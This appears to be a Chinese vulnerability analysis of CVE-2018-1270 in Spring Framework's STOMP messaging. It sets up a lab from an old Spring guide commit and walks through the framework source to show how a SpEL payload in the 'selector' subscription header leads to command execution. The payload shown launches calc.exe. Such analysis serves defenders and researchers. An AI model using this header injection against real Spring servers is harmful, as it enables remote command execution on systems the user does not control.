作者：chybeta  
来源：[先知安全社区](https://xz.aliyun.com/t/2252 "先知安全社区")

#### 漏洞公告

2018年4月5日漏洞公布： <https://pivotal.io/security/cve-2018-1270>

![](https://images.seebug.org/content/images/2018/04/42d8a9b1-3636-4d81-b370-b05bbd45a177.png-w331s)

漏洞影响版本:

  1. Spring Framework 5.0 to 5.0.4
  2. Spring Framework 4.3 to 4.3.14
  3. Older unsupported versions are also affected

#### 环境搭建

利用官方示例 <https://github.com/spring-guides/gs-messaging-stomp-websocket> ，git
clone后checkout到未更新版本：

    
    
    git clone https://github.com/spring-guides/gs-messaging-stomp-websocket
    
    git checkout 6958af0b02bf05282673826b73cd7a85e84c12d3

用IDEA打开gs-messaging-stomp-websocket目录下的complete项目，修改app.js中的第15行：

    
    
    function connect() {
        var header  = {"selector":"T(java.lang.Runtime).getRuntime().exec('calc.exe')"};
        var socket = new SockJS('/gs-guide-websocket');
        stompClient = Stomp.over(socket);
        stompClient.connect({}, function (frame) {
            setConnected(true);
            console.log('Connected: ' + frame);
            stompClient.subscribe('/topic/greetings', function (greeting) {
                showGreeting(JSON.parse(greeting.body).content);
            },header);
        });
    }

增加了一个header头部，其中指定了`selector`，其值即payload。

#### 漏洞利用

点击connect后建立起连接，在文本框中随意输入，点击Send，触发poc：

![](https://images.seebug.org/content/images/2018/04/08c3a2bb-5a2d-4ab0-8997-a4da02621914.gif-w331s)

#### 漏洞分析

当在 <http://localhost:8080/> 中点击Connect后，在app.js中，有如下代码，会建立起Websocket连接：

    
    
    var header  = {"selector":"T(java.lang.Runtime).getRuntime().exec('calc.exe')"};
    ...
    stompClient.subscribe('/topic/greetings', function (greeting) {
        showGreeting(JSON.parse(greeting.body).content);
    },header);

其中`header`中指定了`selector`，根据 [Stomp Protocol Specification, Version
1.0](https://stomp.github.io/stomp-specification-1.0.html "Stomp Protocol
Specification, Version 1.0")，通过指定对应的selecttor，可以对订阅的信息进行过滤：

    
    
    Stomp brokers may support the selector header which allows you to specify an SQL 92 selector on the message headers which acts as a filter for content based routing.
    
    You can also specify an id header which can then later on be used to UNSUBSCRIBE from the specific subscription as you may end up with overlapping subscriptions using selectors with the same destination. If an id header is supplied then Stomp brokers should append a subscription header to any MESSAGE commands which are sent to the client so that the client knows which subscription the message relates to. If using Wildcards and selectors this can help clients figure out what subscription caused the message to be created.

在 org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java
第140行，对这个header参数进行了接受和处理：

    
    
    protected void addSubscriptionInternal(
            String sessionId, String subsId, String destination, Message<?> message) {
    
        Expression expression = null;
        MessageHeaders headers = message.getHeaders();
        String selector = SimpMessageHeaderAccessor.getFirstNativeHeader(getSelectorHeaderName(), headers);
        if (selector != null) {
            try {
                expression = this.expressionParser.parseExpression(selector);
                this.selectorHeaderInUse = true;
                if (logger.isTraceEnabled()) {
                    logger.trace("Subscription selector: [" + selector + "]");
                }
            }
            catch (Throwable ex) {
                if (logger.isDebugEnabled()) {
                    logger.debug("Failed to parse selector: " + selector, ex);
                }
            }
        }
        this.subscriptionRegistry.addSubscription(sessionId, subsId, destination, expression);
        this.destinationCache.updateAfterNewSubscription(destination, sessionId, subsId);
    }

![](https://images.seebug.org/content/images/2018/04/21f02525-9b59-47e8-99e7-963bfb59935c.png-w331s)

如图所示，此次连接对应的sessionId为`mrzfa005`，subsId为`sub-0`。

之后，在 <http://localhost:8080/> 中输入任意字符串，点击send。spring进行了一系列处理后，开始向消息的订阅者分发消息，在
org/springframework/messaging/simp/broker/SimpleBrokerMessageHandler.java:349
行：

    
    
    protected void sendMessageToSubscribers(@Nullable String destination, Message<?> message) {
        MultiValueMap<String,String> subscriptions = this.subscriptionRegistry.findSubscriptions(message);
        ...

其中message保存了此次连接/会话的相关信息：

![](https://images.seebug.org/content/images/2018/04/e523907c-624d-4f37-9e75-a5863cb618d9.png-w331s)

跟入 `this.subscriptionRegistry.findSubscriptions` 至
org/springframework/messaging/simp/broker/AbstractSubscriptionRegistry.java:111
行：

    
    
    public final MultiValueMap<String, String> findSubscriptions(Message<?> message) {
        ....
        return findSubscriptionsInternal(destination, message);
    }

message作为参数被传入 `findSubscriptionsInternal` ，在return处继续跟进至
org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java:184行

    
    
    protected MultiValueMap<String, String> findSubscriptionsInternal(String destination, Message<?> message) {
        MultiValueMap<String, String> result = this.destinationCache.getSubscriptions(destination, message);
        return filterSubscriptions(result, message);
    }

其中result变量值如下：

![](https://images.seebug.org/content/images/2018/04/67b1fc22-28c1-44a5-a58d-215ebc7384d1.png-w331s)

该变量即
`org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java:201`行的filterSubscriptions方法的`allMatches`变量，跟进至两层for循环

    
    
    for (String sessionId : allMatches.keySet()) {
        for (String subId : allMatches.get(sessionId)) {
            SessionSubscriptionInfo info = this.subscriptionRegistry.getSubscriptions(sessionId);
            if (info == null) {
                continue;
            }
            Subscription sub = info.getSubscription(subId);
            if (sub == null) {
                continue;
            }
            ...
        }
    }

通过两次`getSubscriptions`操作，此时取出了先前的配置信息，sub变量值如下：

![](https://images.seebug.org/content/images/2018/04/adcc0350-d414-4b14-b51f-c7201cd66913.png-w331s)

接下去第 207 行将selector表达式取出：

    
    
    Expression expression = sub.getSelectorExpression();

第217行：

    
    
    try {
        if (Boolean.TRUE.equals(expression.getValue(context, Boolean.class))) {
            result.add(sessionId, subId);
        }
    }

通过调用了`expression.getValue(context,
Boolean.class)`，触发payload，执行了spel表达式，远程命令执行成功。

![](https://images.seebug.org/content/images/2018/04/fdb4ecb6-8a74-4d2b-8f91-e35c6daca004.png-w331s)

#### 资料

  * [spring-guides/gs-messaging-stomp-websocket](https://github.com/spring-guides/gs-messaging-stomp-websocket "spring-guides/gs-messaging-stomp-websocket")
  * [spring-framework-reference: websocket-stomp](https://docs.spring.io/spring/docs/current/spring-framework-reference/web.html#websocket-stomp "spring-framework-reference: websocket-stomp")
  * [springmvc(18)使用WebSocket 和 STOMP 实现消息功能](https://blog.csdn.net/pacosonswjtu/article/details/51914567 "springmvc\(18\)使用WebSocket 和 STOMP 实现消息功能")
  * [CaledoniaProject/CVE-2018-1270](https://github.com/CaledoniaProject/CVE-2018-1270/ "CaledoniaProject/CVE-2018-1270")
  * [0c0c0f师傅微博](https://m.weibo.cn/status/4226169915929781?sudaref=xz.aliyun.com&display=0&retcode=6102 "0c0c0f师傅微博")

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/562/>

